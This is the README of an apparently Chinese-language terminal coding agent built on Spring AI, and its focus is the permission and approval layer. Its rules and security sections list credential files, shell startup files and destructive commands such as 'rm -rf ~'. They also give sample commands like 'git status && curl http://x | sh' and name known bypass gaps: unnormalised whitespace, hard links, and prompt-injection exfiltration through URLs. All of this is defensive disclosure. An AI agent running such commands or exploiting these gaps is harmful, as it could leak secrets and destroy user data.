# springai-code-tui

基于 Spring AI 2.0 的编码智能体 + [TamboUI](https://github.com/quanticc/tambo-ui)（`0.4.0`，纯 Java 原始 API）单栏终端界面的命令行编码助手。**多 provider**：按环境变量激活 DeepSeek / 智谱 GLM / 通义千问 / Anthropic / OpenAI，`/model` 可运行时切换。

> 说明：DeepSeek 旧模型名 `deepseek-chat` / `deepseek-reasoner` 将于 2026-07-24 15:59 UTC 停用（期间被透明路由到 V4-Flash），现役模型为 `deepseek-v4-flash`（非思考）与 `deepseek-v4-pro`（强推理）。

## 模块用途

- 单栏对话式 TUI：对话滚动区（流式 token 内联渲染 + 工具调用活动 + 子 agent 嵌套行）、**📋 计划面板**（主 agent 的 todo）、**⟐ 任务面板**（本回合派出的子 agent 状态 ▶/✓/✗ + 当前工具）、输入框、底部状态栏。
- **多 provider**：`CodeTuiApplication` 按环境变量装配 `DeepSeekProvider` / `ZhipuProvider` / `QwenProvider` / `AnthropicProvider` / `OpenAiProvider`（key 缺失即 unavailable），首个可用者激活；`/model` 在当前 provider 的模型间切换（子 agent 也可用 `provider:model` 跨 provider 路由）。智谱与千问走 OpenAI 兼容通路（复用 `spring-ai-openai`，`ZHIPU_BASE_URL` 默认 `.../api/paas/v4`、`DASHSCOPE_BASE_URL` 默认 `.../compatible-mode/v1`）。五家统一 read 超时（`CODETUI_LLM_READ_TIMEOUT_SECONDS`，默认 300s）。
- 智能体工具：`FileSystemTools`（read/write/edit）、`ShellTools`（执行 shell 命令）、`GrepTool`、`GlobTool`、`TodoWriteTool`、`SmartWebFetchTool`（联网抓取网页正文）、`BochaWebSearch`（联网搜索·中文内容优先，博查 API，需配 `BOCHA_API_KEY`）、`BraveWebSearch`（联网搜索·英文内容优先，Brave API，需配 `BRAVE_API_KEY`；两家可共存，模型按内容语言自选，都不配则均不注册）、`AskUserQuestionTool`（向用户反问、多选拍板）、`SubagentTool`（`Task` 委派单个子 agent + `ParallelTasks` 并发派多个独立子 agent）、`AutoMemoryTools`（`Memory*` 六件套：跨会话长期记忆的读写/增删/改名，仅主 agent）。
- **权限管理（审批面板 + 规则）**：有副作用的工具调用**在执行之前**被拦下弹审批面板（↑↓ 选择、1-5 快选、Enter 确认、Esc 中断），你可以「允许一次 / 本会话不再问 / 永久允许（写入 `.codetui/permissions.json`）/ 拒绝（回合继续，模型换做法）/ 拒绝并中断回合」。只读操作直接放行；**网络工具每次都问**（请求内容会离开本机），允许后可按域名永久放行。`Shift+Tab` 在「默认 / 自动接受编辑 / 计划模式」三档间循环，当前档位**常驻状态栏**；**计划模式**只放行只读调查、写与命令一律**拒绝**，模型改用 `ExitPlanMode` 交一份计划，经你批准（自动接受编辑 / 逐个确认 / 打回继续完善）后才动手；`/permissions` 查看生效模式与规则。另有一层**任何 allow 规则与 BYPASS 都盖不住**的内置底线（写 `.ssh`/`.aws`/`.kube`/`.gnupg`/`.git`/`.codetui` 配置、写 shell 启动文件、读私钥与凭据、`rm -rf /` 或 `~` 或变量目标…）。详见下方「权限管理」。
- **子 agent（Task / ParallelTasks）**：内置 `explore` / `plan` / `bash` / `general-purpose` 四类（`src/main/resources/agents/*.md`）。`Task` 委派单个子 agent 前台阻塞执行；`ParallelTasks` 一次并发派多个独立子 agent（有界线程池，`CODETUI_SUBAGENT_CONCURRENCY` 默认 4、范围 [1,32]；失败隔离、按序汇总）。内部工具活动带 taskId 内联嵌套显示。
- **技能（Skills）**：`/skills` 查看可用技能清单（模型按需自动调用），`/skill` 为本条消息手动指定技能，`/reload` 重新扫描技能目录——运行中新增/删除 `SKILL.md` 无需重启即对模型与 `/skills` 生效（即便启动时零技能，也能 `/reload` 出第一个新增技能）。
- **MCP（接入外部工具）**：启动时读 `.codetui/mcp.json`（两层：用户 `~/.codetui/mcp.json` + 项目 `<项目根>/.codetui/mcp.json`，项目级同名覆盖用户级）连接外部 [MCP](https://modelcontextprotocol.io/) server（**stdio** 本地子进程，如 `npx`/`uvx` 起的 `chrome-devtools-mcp`、官方 filesystem server；以及 **Streamable HTTP** 远程 server，如 Context7），把其工具注入**主 agent 与子 agent**。工具名带 `mcp__<server>__<工具>` 前缀避免撞名。**`/mcp` 运行期管理**：面板列出全部 server（含禁用/连接失败项），逐个启用/禁用即时生效（下一回合模型即见/不见其工具）并回写 `mcp.json` 的 `enabled` 字段。连不上的 server **静默降级**（记 WARN、不崩启动）；退出时**有界清理**子进程（≤2s，绝不拖慢 `/exit`）。配置见下方「MCP 配置」。
- **上下文管理**：窗口记忆多轮会话，token 用量估算（`/context` 查看），超阈值自动压缩 + `/compact` 手动压缩。把 cwd / git 状态 / 模型名注入系统提示做 grounding。
- **长期记忆（跨会话）**：基于 `spring-ai-agent-utils` 的 `AutoMemoryTools`（Anthropic Claude Code 那套：`MEMORY.md` 索引 + 分型 Markdown 文件 + 两步保存）。记忆落盘 `<项目根>/.codetui/memory/`（**按项目隔离**，已被 `.gitignore`）；agent 会主动记住用户偏好、项目上下文与反馈，并在后续会话（含 `/clear` 开新会话后）读 `MEMORY.md` 召回。仅主 agent 具备，子 agent 不写长期记忆。与会话记忆互补：会话记忆是当前对话的内存态窗口，长期记忆是跨会话的磁盘态精选事实。
- **项目指令（AGENTS.md）**：启动时读取用户级 `~/.codetui/AGENTS.md` + 项目级 `<项目根>/AGENTS.md`（跨工具生态标准，Codex/Cursor/Aider 等通用；项目里已有的 `AGENTS.md` 直接被读到），把团队约定（构建/测试命令、代码风格、架构约定）注入**主 agent 与子 agent** 的系统提示（顺序 user→project，项目级优先级更高）。人手写、提交入库、启动全量注入、**只读**（编辑文件即改约定，改动需重启生效）。这是与 agent 自写的长期记忆正交的一套「instructions」：前者人写团队约定，后者 agent 自记学到的东西。
- Esc 取消当前回合、Ctrl+C 退出；输入框支持 readline 式编辑快捷键（Ctrl+A/E、Ctrl/Alt+←→ 按词跳、Ctrl+W 删前词、Ctrl+U/K，见「操作键」）。

## ⚠️ 安全声明（请务必阅读）

**本工具不是安全沙箱。** 它给智能体开放了对本机文件系统和 shell 的实质性访问能力。本版本起有了一层**权限管理**（见下方「权限管理」），但请务必分清它是什么、不是什么：

> **权限层管的是「要不要做这一步」，不是「能做到多远」。**
> 它在工具**执行之前**把有副作用的调用交给你确认；一旦你按下允许，那次调用照样以**你的用户权限**执行，**不受任何目录边界约束**。
> 它降低的是「模型自作主张、或被提示注入后无声搞破坏」的风险；它**不**降低「你自己按了允许」之后的风险，**也不是**隔离容器。真正的目录级强制沙箱仍是后续增强项。

具体边界如下：

- **所有工具在技术上都不受工作区 root 目录限制，没有强制边界。** `FileSystemTools` 底层依赖 `spring-ai-agent-utils` *支持*可选的 `allowedDirectory` 沙箱，但本工具**刻意不启用**——因为 `ShellTools`/`GrepTool`/`GlobTool` 本就能越界，单给文件读写工具设边界形同虚设、反而制造「有沙箱」的假象。故全线一致：**靠执行前的人工确认 + 系统提示自律，而不是靠边界**。
- **`FileSystemTools` / `ShellTools` / `GrepTool` / `GlobTool` 均不受 root 限制：**
  - `FileSystemTools` 的 read/write/edit 可直接用绝对路径读写 root 之外的任意文件（未配置 `allowedDirectory`，库对空配置直接放行）。
  - `ShellTools.bash(...)` 直接 `new ProcessBuilder(...).start()`，没有设置工作目录约束，模型可以执行任意 shell 命令（包括 `cd /`、绝对路径操作、`rm -rf`、`curl | bash` 等）。
  - `GrepTool` / `GlobTool` 的 `workingDirectory` 只是**默认基准目录**，不是强制边界——只要参数传绝对路径或 `../`，照样能读到/列出 root 之外的任意文件。
- 也就是说：**一旦某次调用被放行（你批准、命中 allow 规则、或处于宽松模式），智能体就可以读写磁盘上任意它有权限触及的位置、执行任意命令**，不局限于当前工作目录。
- **权限层自身的已知弱点**（诚实列出，别高估它）：
  - **审批疲劳**是最现实的风险——弹得多就容易一路按「允许」，那与没有权限层无异。这也是「允许，永久」刻意生成**最窄规则**（该文件本身 / 该命令前缀 / 该域名）的原因。
  - **内置底线是黑名单，不是白名单**：它枚举已知的高危目标（密钥、shell 启动文件、`rm -rf /`…），没枚举到的自然漏过。
  - **命令判定是尽力而为**：含命令替换 `` ` ``/`$()`、进程替换、引号不配对等**拆不动**的命令一律退回人工确认（失败关闭），但规则 DSL **不做空白归一**（`rm  -rf /` 双空格不命中 `Bash(rm -rf /:*)`）。**deny 规则是尽力而为，真正的护栏是不可绕过的内置底线。**
  - **同一个文件的多种写法**：`deny`/`ask` 规则与内置底线会**折叠大小写**、并**解析符号链接**（含目标尚不存在的悬空链接），故 `deny Write(/etc/**)` 拦得住 `/ETC/passwd`，经链接指向 `.ssh/` 的写入也拦得住。
    > **`allow` 规则只认原写法，这是设计不是疏漏**：deny 误拦你看得见、能调整；allow 误放行**不可逆**。所以放宽匹配只在「问一下无害」的方向上做。
    >
    > 「解析符号链接」**不等于**所有别名都认得出。认不出的仍有：链环或超过 8 跳的链接、读不到链接内容（权限/竞态）、**硬链接**（同 inode 的另一个路径，文件系统不提供反查）、**macOS firmlink**（`/System/Volumes/Data/Users/…` 与 `/Users/…` 是同一份文件，`toRealPath` 不收敛）。后两类靠内置底线的结构匹配兜。
  - **只读操作不询问**：`Read`/`Grep`/`Glob` 直接放行（工作材料，逐条问不可用）。读私钥/凭据类文件仍会被内置底线拦下，但「读了什么」整体上不在审批范围内。
- **联网出口无过滤**：`SmartWebFetchTool`（抓取任意网址）与两个搜索工具（`BochaWebSearch` / `BraveWebSearch`，把搜索词发给第三方搜索服务）都可发起对外 HTTP 请求，无域名白名单/出网限制——被提示注入时可能外泄本地读到的内容。搜索工具额外意味着智能体构造的查询词会离开本机；其中 **`BraveWebSearch` 的查询词发往 Brave（美国公司），属于数据出境**，与博查（国内服务、内容合规过滤）性质不同，按需自行取舍是否配置该 key。
- **远程 MCP server 会收到工具调用的入参**：配置了 `type: "http"` 的远程 server 后，智能体调用其工具时，**入参会发往该服务端**（例如查询词、库名、代码片段），这与本地 stdio server（数据不出本机）性质完全不同。请只连你信任的服务端；`headers` 里的 token 建议用 `${ENV_VAR}` 引用而非写死在配置文件里。
- **子 agent 同权**：`SubagentTool`（`Task`）派出的子 agent 复用同一套未沙箱工具，其执行同样不受目录约束。

这是已知且被接受的残余风险（诚实披露，而不是技术强制沙箱）。**请不要将本工具理解或宣传为"安全隔离"。**

### 使用建议

- **只在可以随意丢弃、且已被版本控制干净纳管的目录中运行本工具**，方便万一出问题时用 `git checkout`/`git clean` 恢复或直接丢弃整个目录。
- **不要在 `$HOME`、系统关键目录，或任何重要仓库的根目录下直接运行。**
- **别把审批面板当橡皮图章**：面板会显示这次要动的具体目标（文件路径 / 命令段 / URL）与拦下它的理由，值得看一眼再按。
- **`--dangerously-skip-permissions` 只在你完全清楚后果时用**（如一次性容器里）。

真正的目录级强制沙箱（自写 `SandboxedShellTool` 校验所有工具的路径参数）留作后续的安全增强，本版本不包含——权限层是**执行前确认**，不是边界强制。

## 构建

```bash
mvn -pl springai-code-tui -am package
```

## 运行

> 发布包（`-Pdist` 产出的 tar.gz/zip）用户：解压后把 `bin/config.env.example` 复制为 `bin/config.env` 填 key 即可，
> `bin/code-tui` 会自动加载，无需手动 export。下面的环境变量方式与 `config.env` 里的键名完全一致、二选一。

```bash
# 至少配置一个 provider 的 key（首个可用者激活；可同时配多个，用 /model 切换）
export DEEPSEEK_API_KEY=你的key          # DeepSeek（默认现役，默认 deepseek-v4-pro，另有 v4-flash 非思考款）
# export ZHIPU_API_KEY=你的key           # 智谱 GLM（默认 glm-5.2，另有 glm-5.1/glm-5-turbo；OpenAI 兼容通路）
# export DASHSCOPE_API_KEY=你的key       # 通义千问（默认 qwen3.7-max，另有 3.7-plus/3.6-flash/qwen3-coder-next；OpenAI 兼容通路）
# export ANTHROPIC_API_KEY=你的key       # Anthropic（默认 claude-opus-5，另有 fable-5/sonnet-5/haiku-4-5/opus-4-8）
# export OPENAI_API_KEY=你的key          # OpenAI（默认 gpt-5.6-sol，另有 terra/luna）
# 各 provider 可选自定义 base url：DEEPSEEK_BASE_URL / ZHIPU_BASE_URL / DASHSCOPE_BASE_URL / ANTHROPIC_BASE_URL / OPENAI_BASE_URL
# 各 provider 可选自定义模型清单（逗号分隔，首项为默认模型；不配则用内置清单）：
#   DEEPSEEK_MODELS / ZHIPU_MODELS / DASHSCOPE_MODELS / ANTHROPIC_MODELS / OPENAI_MODELS
#   例：export DEEPSEEK_MODELS=deepseek-v4-pro,deepseek-v4-flash
# 可选调优：CODETUI_LLM_READ_TIMEOUT_SECONDS（默认 300）、CODETUI_SUBAGENT_CONCURRENCY（默认 4）

# 切到一个可以随意丢弃、且被版本控制干净纳管的目录再运行
cd /path/to/some/disposable/project

java -jar /Users/zxh/IdeaProjects/springai-agentdemo/springai-code-tui/target/springai-code-tui.jar

# 恢复上次会话（仿 Claude Code 的 -c）：接着上次的对话/计划继续
java -jar .../springai-code-tui.jar -c            # 或 --continue
```

启动后直接进入 TUI（当前工作区即上面 `cd` 进入的目录）。请自行遵循上方「安全声明」的使用建议。

### 会话持久化与恢复

会话事件持久化在 `<项目根>/.codetui/sessions/<sessionId>.json`（**按项目隔离**，已被 `.gitignore`）。

- **默认启动**：开一个**全新会话**（干净上下文，不读旧历史），生成一个新 session 文件；旧会话文件原封不动。
- **`-c` / `--continue` 启动**：恢复**最近一次**会话（按文件最后修改时间选），并把上次对话**直观回放进界面**（仿 Claude Code `--continue`：重现用户消息、助手正文与工具调用/结果标记，而非只提示「已恢复 N 条」），可接着聊，或用 `/continue` 续跑上次未完成的计划。
- 仓库惰性加载：默认启动不读盘；只有 `-c` 选中的那个会话才被载入。加载时会裁掉上次硬中断残留的悬空工具调用，避免续跑首个请求报错。

### 日志位置

日志**不写进当前工作目录**（免得每个被操作的项目里都冒出一个 `logs/`）：

- **用 `bin/code-tui` 启动**（发布包）：写到**安装目录**下的 `logs/`（与程序同处）；若安装在只读位置，回退到 `~/.codetui/logs/`。
- **直接 `java -jar` 或 `mvn` 运行**：写到 `~/.codetui/logs/`。
- 机制：启动脚本经 `-Dcodetui.log.dir=<dir>` 把目录交给 logback（见 `logback.xml`）；未设置时默认 `~/.codetui/logs`。滚动策略：单文件 10MB、保留 7 天、总量上限 100MB。

## 权限管理（审批与规则）

有副作用的工具调用**在执行之前**被拦下、交给你确认。拦截点在工具装饰链的**最外层**——比超时、比媒体外置都靠外，所以被拒绝的调用**根本没开始跑**，界面上也不会先冒出一行「工具运行中」再变失败。

### 审批面板

```
  ⚠ 需要授权：Bash
     git push origin main
     ↑ 命令的第 1 段 `git push origin main` 不在自动放行范围内（只读白名单之外的命令一律先问一次）
     ↳ 允许后将记下规则：Bash(git push origin main)
  ❯ 1. 允许一次
    2. 允许，本会话不再问
    3. 允许，永久
    4. 拒绝，让模型换个做法
    5. 拒绝并中断本回合
```

| 选项 | 效果 |
|---|---|
| **1. 允许一次** | 只放行这一次，下次同样的调用还会问 |
| **2. 允许，本会话不再问** | 加一条**内存态**规则，重启即失效 |
| **3. 允许，永久** | 写入**项目级** `<项目根>/.codetui/permissions.json`（写盘失败自动降级为「本会话」并提示） |
| **4. 拒绝，让模型换个做法** | 工具返回一条「被用户拒绝」的结果，**回合继续**，模型据此换方案 |
| **5. 拒绝并中断本回合** | 整个回合结束（等同 Esc） |

- **给不出建议规则时只有 3 项**（去掉「本会话/永久」），面板会打一行 `ⓘ 这类调用不提供「本会话 / 永久」，每次都会问（原因见上一行）`。两种成因，`↑` 那行会写明是哪一种：
  - **加规则也没用**——内置底线（第 2 步）与 `ask` 规则（第 4 步）都排在 allow 规则之前，显示那两项就是谎言；
  - **给不出一条安全的规则**——命令拆不动（下次同样拆不动，写下去是条死规则）、入参里没有可解析的目标、URL 取不到域名（不猜，绝不退化成 `WebFetch(*)`）。
- 建议规则刻意取**最窄**形态：
  - **路径** → 该文件**本身**（`report[2026].md` 这种含 glob 元字符的名字会被转义，否则规则永不命中它自己、却放开了别的文件）；
  - **命令** → 单段且首词安全时给前缀规则（`mvn test -pl x` → `Bash(mvn test:*)`）。首词能跑任意代码或有破坏性时（`git` `bash` `python` `sudo` `rm` `find` `make`…）**不给前缀**——那会把 `Bash(rm:*)`（此后任何 `rm` 都不再问）当成「以后别问了」发出去；这类命令与多段命令一律给**整串字面量**（`Bash(git push origin main)`），逐字相等才命中，不可能比你批准的那次更宽。`mvn`/`npm`/`docker`/`kubectl` 一类**必须带子命令**（`Bash(mvn test:*)` 可以，`Bash(mvn:*)` 不行）；命令拆不动时不给建议，面板只剩允许一次/拒绝；
  - **网络** → 域名前缀 `WebFetch(https://host/:*)`（结尾的 `/` 不能省，否则会一并命中 `host.evil.com`）。搜索类工具的 query 每次都不同，按整个工具授权；
  - **未登记工具（含全部 MCP）** → 只给 `工具名(*)`，**绝不**把每次都变的入参写成 pattern（那条规则下次必然不命中 → 反复弹窗 → 用户转去开 BYPASS，比放宽更糟）。
- 子 agent（`Task`/`ParallelTasks`）用**同一个**权限引擎，面板同样会为它们弹出；并发触发时逐个排队。

### 判定顺序

每次调用按这个顺序走，**先命中先返回**：

| # | 步骤 | 说明 |
|---|---|---|
| 1 | **deny 规则** | 最高优先级，**BYPASS 下也生效** |
| 2 | **内置危险检查** | 排在 allow 之前，故**任何 allow 规则与 BYPASS 都盖不住**；命中强制询问（护栏不是牢笼，人确认了就该能做） |
| 3 | *(工具自审插槽)* | 本期无实现方，预留 |
| 4 | **ask 规则** | 每次都问 |
| 5 | **allow 规则** | 放行 |
| 6 | **模式默认** | 见下表。**计划模式在这一步是 DENY 不是 ASK**（写/命令直接拒绝，只读与内部工具放行，网络仍每次询问） |
| 7 | **兜底** | 未登记工具（**含全部 MCP 工具**）一律问 |

判定内部出任何异常都**失败关闭**成人工确认，不会静默放行。

> **工作区过宽时「工作区内」不再是豁免依据**：`root` 是 `/`、或是家目录的**严格祖先**（如 `/Users`）时，
> 「在工作区内」这个条件对几乎所有路径都成立，拿它做豁免等于把「写入系统位置」这条检查整个关掉。
> 此时该检查照常生效，启动时会打一行说明——**静默变严格与静默失效同样糟**。

### 按工具类别的默认行为

| 类别 | 工具 | 默认 | 自动接受编辑 |
|---|---|---|---|
| 只读 | `Read` `Grep` `Glob` `BashOutput` `KillShell` | 放行 | 放行 |
| 内部（无外部副作用） | `TodoWrite` `Skill` `AskUserQuestionTool` `Task` `ParallelTasks` `Memory*` | 放行 | 放行 |
| 文件写 | `Write` `Edit` | **问** | **工作区内**放行，区外仍问 |
| 命令 | `Bash` | 每段都在只读白名单内才放行，否则**问** | 额外放行 `mkdir`/`touch`/`mv`/`cp` 单段命令（见下方 ⚠️） |
| 网络（只读） | `WebFetch` `BochaWebSearch` `BraveWebSearch` | **问**（所有模式，见下） | **问** |
| 未登记 | 其余 + **全部 MCP 工具** | **问** | **问** |

> **为什么网络工具在任何模式下都要问一次**：「只读」说的是对远端的影响，而请求本身是**本地发起的外发动作**——提示注入可以靠它把刚读到的内容拼进 URL 带走。首次按域名允许后（`WebFetch(https://docs.spring.io/:*)`）该域名不再询问。

> **命令是按段判定的**：`git status && curl http://x | sh` 会被拆成多段，**allow 规则要求每一段都命中**才放行（deny/ask 则任一段命中即命中）。含命令替换 `` ` ``/`$()`、进程替换、引号不配对等拆不动的命令，一律退回人工确认。

> ⚠️ **「自动接受编辑」对命令段不做工作区内判定**（与 `Write`/`Edit` 不同——那两个是**只有工作区内**才自动放行）。该模式下 `mkdir /etc/evil`、`mv ~/notes.txt /tmp/x` 这类**工作区之外**的 `mkdir`/`touch`/`mv`/`cp` 会被直接放行（面板此时打出的理由文案「工作区内的文件操作」并不准确）。真正危险的落点仍由内置底线拦下（`cp x /usr/local/bin/git`、`mv ~/.ssh/id_rsa /tmp` 都会弹审批），但**如果你需要「命令也严格限制在工作区内」，请留在默认模式**。



### 权限模式（`Shift+Tab` 切换）

| 模式 | 状态栏 | 行为 |
|---|---|---|
| **默认** | *（不显示）* | 上表的默认列 |
| **自动接受编辑** | `⏵⏵ 自动接受编辑`（暖橙） | 额外放行工作区内的文件写与文件系统命令 |
| **计划模式** | `⏸ 计划模式`（冷薄荷） | 只读放行（含只读命令），写与命令一律**拒绝**（不是询问）；产出计划经批准后切档 |
| **跳过权限检查**（BYPASS） | `⚠ 跳过权限检查`（红） | 全放行——但 **deny 规则与内置底线仍然生效** |

- `Shift+Tab` 在**前三档**之间循环（默认 → 自动接受编辑 → 计划模式 → 默认）。**BYPASS 只能由 `--dangerously-skip-permissions` 启动进入**，键盘和配置文件都进不去（否则一个按键或一次 `git clone` 就把这道启动开关架空了）。
- **计划模式为什么是「拒绝」而不是「询问」**：能当场批准，这一档就名存实亡了。被拒的工具结果里会写明当前档位与正确的下一步（改调 `ExitPlanMode`），否则模型会对同一个写操作反复重试、把回合耗光。网络工具在这一档仍是**每次询问**（不是拒绝）——调研常要读文档。
- 当前档位**常驻状态栏行首**（默认档不占位）。`/permissions` 可随时查看生效模式、全部规则与内置底线摘要。

### `permissions.json`

两层，**用户级 + 项目级取并集**（不是覆盖）：

| 层 | 路径 | 说明 |
|---|---|---|
| 用户级 | `~/.codetui/permissions.json` | 你自己的机器，不受限制 |
| 项目级 | `<项目根>/.codetui/permissions.json` | 随仓库走；「允许，永久」写的就是这一层 |

```json
{
  "defaultMode": "default",
  "allow": ["Bash(mvn test:*)", "Bash(git status:*)", "WebFetch(https://docs.spring.io/:*)"],
  "ask":   ["Write(pom.xml)"],
  "deny":  ["Read(**/.env)", "Write(/etc/**)"]
}
```

`defaultMode` 取值 `default` / `acceptEdits`（大小写不敏感，也认 `DEFAULT`/`ACCEPT_EDITS`）；**不接受 `BYPASS`**，见下。未知取值记 WARN 后回退默认模式。顶层只认 `defaultMode`/`allow`/`ask`/`deny` 四个键，其余（含拼错大小写的 `Deny`）记 WARN——一条拼错的禁令等于一条隐形缺失的禁令。

**规则 DSL** 是 `工具名(内容模式)`，三种形态：

| 形态 | 含义 | 例 |
|---|---|---|
| `工具名` 或 `工具名(*)` | 该工具的**全部**调用 | `WebFetch(*)` |
| `工具名(字面量:*)` | **前缀匹配**，`:` 之前按原样比较、**不解释通配符** | `Bash(mvn test:*)` |
| 其余 | 目标是路径时按 **glob**（`*` 单层、`**` 递归），否则整串相等 | `Write(src/**)` |

- `:*` 前缀语义**只对命令/URL 一类生效**；路径目标上写 `Write(/etc/:*)` **恒不命中**——要写 `Write(/etc/**)`。这类恒不命中的规则启动时会记 WARN（一条静默失效的 deny 比没有 deny 更糟）。
- 前缀停在**分隔符**上时会匹配任意续接：`Bash(rm -rf /tmp/:*)` 同样命中 `rm -rf /tmp/../home/user`。手写请让前缀停在完整词上（面板自动生成的规则保证不会停在非字母数字字符上）。

**项目层只能收紧，不能放宽**——`~/.codetui/` 是你自己的配置，`<项目根>/.codetui/` 是**仓库带来**的配置，**clone 一个仓库不得让 agent 变得更宽松**。据此关掉三条放宽路径：

1. `defaultMode` **两层都不接受 `BYPASS`**（这文件 agent 自己写得到，认了它「全放行」就多出两条不经人手的入口）；
2. **项目层的 allow 不得是通配放行**（`{"allow":["*"]}` 就是换了写法的 `--dangerously-skip-permissions`）；
3. **项目层的 `defaultMode` 只能比用户层严**。

收紧方向一律照常：项目层的 deny/ask（含通配）、收窄型 allow（`Bash(mvn test:*)`）、往严走的 `defaultMode` 都生效。**deny 只增不减，项目层不能削弱用户层的禁令。**

**降级契约**：文件缺失 / JSON 非法 / 单条规则非法 / `defaultMode` 未知 → 记 WARN、跳过，**绝不抛异常**（权限层挂了会把整个 agent 带走，比没有权限层更糟）。JSON **重复键按整文件非法**处理——Jackson 默认末键胜出，人读文件看到一条 deny 在生效、运行时它却不存在。

### 内置底线（不可绕过）

任何 allow 规则、`defaultMode`、BYPASS 都**盖不住**这一层，命中即询问：

- 写 `.ssh` / `.aws` / `.kube` / `.gnupg` / `.git` / `.codetui` 等配置与凭据目录
- 写 shell 启动文件（`.zshrc`/`.bashrc`/`.profile`…）与自动执行位置（LaunchAgents、`.vscode/tasks.json`、git hooks…）
- 读私钥与凭据（`id_*`、`*.pem`/`*.p12`/`*.jks`、`.netrc`/`.pgpass`、`/etc/shadow`…）
- `rm -rf /`、`rm -rf ~`、目标是**变量**的删除（`rm -rf $DIR`——展开成什么无从得知）
- 上述检查**穿透** `sudo`/`env`/`xargs`/`bash -c` 一类包装，也覆盖 `cp`/`mv`/`curl -o`/`tar` 等**写目的地**

> **计划模式下这一层给的是 DENY 而不是 ASK**（仅限「计划模式本来就会拒的」那些操作，即写与非只读命令）。否则会出现结论倒置：普通的 `mvn test` 被拒，而 `rm -rf ~` 反倒因为命中内置检查而变成**唯一能当场批准**的口子。判据是「计划模式本来就会拒的，危险检查不得把它降级成可批准」。
>
> **读密钥与凭据在计划模式下仍然是 ASK**——这一档承诺的是「不动手」，不是「不读」，只读调查正是它要允许的事。

### 启动参数

```bash
java -jar springai-code-tui.jar --dangerously-skip-permissions
java -jar springai-code-tui.jar --permission-mode plan
```

`--dangerously-skip-permissions` 启动时打一条 ⚠ 提示，进入 BYPASS。**deny 规则与上面那层内置底线依然会拦你**——这是刻意的。

`--permission-mode <default|acceptEdits|plan>` 指定起始档位（也支持 `--permission-mode=plan` 写法）。**它不接受 `bypass`**：全放行只能由 `--dangerously-skip-permissions` 进，否则那道启动开关就等于有了第二个入口。两个参数同时出现时 `--dangerously-skip-permissions` 优先，并打一行「已忽略 --permission-mode …」。取值非法或缺值只记一条 warn 并忽略，不影响启动。优先级：`--dangerously-skip-permissions` > `--permission-mode` > 配置文件 `defaultMode`。

## MCP 配置（接入外部工具）

在**项目根**放 `.codetui/mcp.json`（或用户级 `~/.codetui/mcp.json`，两者按 server 名合并、项目级优先），列出要连接的 MCP server。启动时自动连接并把其工具交给智能体；**无此文件则不启用 MCP，一切照常**。

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
    },
    "chrome-devtools": {
      "command": "npx",
      "args": ["chrome-devtools-mcp@latest"],
      "env": { "FOO": "bar" },
      "enabled": true,
      "timeoutMs": 20000
    }
  }
}
```

stdio 字段：`command`（必填，可执行命令）、`args`（可选，参数数组）、`env`（可选，追加环境变量）、`enabled`（可选，默认 `true`；设 `false` 停用该条——也可在程序内用 `/mcp` 面板切换，切换会回写此字段）、`timeoutMs`（可选，连接/初始化超时，默认 20000）。`enabled` 与 `timeoutMs` 两种传输通用。

连接**远程 server**（Streamable HTTP）写 `type: "http"`：

```json
{
  "mcpServers": {
    "context7": {
      "type": "http",
      "url": "https://mcp.context7.com/mcp",
      "headers": { "Authorization": "Bearer ${CONTEXT7_API_KEY}" },
      "timeoutMs": 30000
    }
  }
}
```

- **两种传输**：`type` 省略即 `"stdio"`（本地子进程，`npx` / `uvx` 一类）；远程 server 写 `"http"` 或 `"streamable-http"`（两种拼写都认）。`"sse"`（旧标准，官方已 deprecated）**暂未支持**，配了会记 WARN 并跳过。
- **`url`**（http 类型必填）：写完整端点地址，内部会拆成 baseUri + endpoint 两段。必须是 `http`/`https` 绝对地址，否则记 WARN 并跳过。
- **`headers`**（可选）：其**值**支持 `${ENV_VAR}` 插值——token 留在环境变量里，配置文件只写引用，便于多机共用同一份 `mcp.json`。不含 `${}` 的字面值照常可用。**引用了未定义的环境变量 → 整条 server 跳过并记 WARN**，而不是带着字面量 `${TOKEN}` 去请求（那只会换来一个看不懂的 401）。
- **工具命名**：发现的工具以 `mcp__<server>__<工具名>` 注入（如 `mcp__filesystem__read_file`），既避免与内置工具/多 server 间撞名，也便于在工具活动行一眼看出出处。段内非法字符会被归一。
- **优雅降级**：某个 server 连不上（命令不存在、启动失败、超时）只记一条 WARN 并进「连接失败」态（`/mcp` 面板可见失败原因、可重试启用），**不影响其他 server、不崩启动**；`mcp.json` 缺失或 JSON 非法同样视为「未启用 MCP」。
- **可用范围**：MCP 工具对**主 agent 与子 agent**（`Task` / `ParallelTasks`）都可用。
- **运行期管理（`/mcp`）**：空闲时输入 `/mcp` 打开面板，列出两层配置的全部 server（含 `enabled:false` 与连接失败项，标注来源层/状态/工具数，Tab 展开工具清单）。Enter 切换启用/禁用：**即时生效**（禁用立刻摘除工具并后台关连接；启用后台连接、成功即注入）且**回写**该条目所属层 `mcp.json` 的 `enabled` 字段（重启后保留；回写失败降级为「仅本次运行生效」并提示）。
- **生命周期**：启动时并行连接 enabled 项；运行期经 `/mcp` 启停（新增/删除条目或改 `command` 等仍需重启）；`/exit` 时有界清理子进程（≤2s，绝不拖慢退出，见「已知限制」的残留说明）。
- **前置**：stdio server 多为 Node 包，需本机有 `node` / `npx`（或对应运行时）。
- **安全**：MCP server 是你在 `mcp.json` 里显式声明的外部子进程，拥有该进程自身的权限（如 filesystem server 能读写你授权的目录）。它与下方「安全声明」同理**非沙箱**——只连接你信任的 server，别把敏感信息交给来路不明的 server。

## 技能配置（Skills）

技能（Skill）是一份 Markdown 指令文件（`SKILL.md`），描述「遇到某类任务时该怎么做」。模型会按需自动调用（`/skills` 查看清单、`/skill` 手动指定），把该文件正文注入到当前这条消息，从而在特定场景下给模型专门的方法论/操作规程。

### 从哪里读取（两层目录）

启动时扫描**两个文件系统目录**，每个技能是**一个子目录、里面放一个 `SKILL.md`**：

| 层 | 路径 | 说明 |
|---|---|---|
| 用户级 | `~/.codetui/skills/<技能名>/SKILL.md` | 跨项目复用（`user.home` 下） |
| 项目级 | `<项目根>/.codetui/skills/<技能名>/SKILL.md` | 随仓库版本化，**同名覆盖用户级** |

- **技能名 = 子目录名**；合并顺序为**用户 → 项目**，同名以**项目级**为准（项目可覆盖你的个人版）。
- 目录不存在的层**静默跳过**；某层解析报错只跳过该层，不影响另一层、也不崩启动。
- **无 classpath 内置层**——只有上面这两个磁盘目录（没有随 jar 打包的内置技能）。
